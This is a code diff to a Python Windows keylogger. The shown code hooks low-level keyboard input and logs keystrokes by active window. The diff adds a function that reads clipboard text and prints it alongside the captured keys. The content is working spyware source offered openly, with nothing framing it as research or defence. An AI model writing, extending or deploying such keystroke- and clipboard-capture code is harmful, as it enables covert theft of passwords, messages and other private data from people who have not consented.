@@ -19,7 +19,7 @@ import threading
 import time
 import datetime
 import platform
-
+import os
 
 LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
 HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, POINTER(c_void_p))
@@ -43,8 +43,9 @@ GetModuleHandleW.argtypes = [LPCWSTR]
 WH_KEYBOARD_LL=13
 WM_KEYDOWN=0x0100
 
-psapi = windll.psapi
-current_window = None
+psapi=windll.psapi
+current_window=None
+paste=None
 
 keyCodes={
 	0x08 : "[BKSP]",
@@ -75,7 +76,7 @@ keyCodes={
 class KeyLogger(threading.Thread):
 	def __init__(self, *args, **kwargs):
 		threading.Thread.__init__(self, *args, **kwargs)
-		self.hooked	 = None
+		self.hooked=None
 		self.daemon=True
 		self.keys_buffer=""
 		self.pointer=None
@@ -151,6 +152,14 @@ def get_current_process():
 	kernel32.CloseHandle(h_process)
 	return executable.value, window_title.value
 
+##http://nullege.com/codes/show/src%40t%40h%40thbattle-HEAD%40src%40utils%40pyperclip.py/48/ctypes.windll.user32.OpenClipboard/python
+def winGetClipboard(): #link above is multiplatform, this can easily expand if keylogger becomes multiplatform
+	windll.user32.OpenClipboard(0)
+	pcontents = windll.user32.GetClipboardData(13) # CF_UNICODETEXT
+	data = c_wchar_p(pcontents).value
+	windll.user32.CloseClipboard()
+	return data
+
 if __name__=="__main__":
 	proc_blacklist = ['explorer.exe']
 	proc_whitelist = [] # can expand on this
@@ -161,6 +170,7 @@ if __name__=="__main__":
 	keyLogger = KeyLogger()
 	keyLogger.start()
 	while True:
+		getcb = winGetClipboard
 		exe, win_title = get_current_process()
 		curr_title_split = set(win_title.lower().split())
 		if (exe.lower() in proc_blacklist) or (title_blacklist & curr_title_split):
@@ -168,8 +178,12 @@ if __name__=="__main__":
 		elif keyLogger.keys_buffer == "":
 			pass
 		else:
+			if paste != getcb():
+				paste = getcb()
+				print '[Clipboard]:',paste,'[/Clipboard]'
+
 			if current_window != win_title:
 				if (current_window != '') or (current_window != 'Task Switching'):
-					print datetime.datetime.now(),current_window # one issue here, prints datetime line with no current window title when switching windows with first character of dump. i stare at this too long and now i cant figure out
+					print datetime.datetime.now(),current_window
 					print keyLogger.dump()
 					current_window = win_title
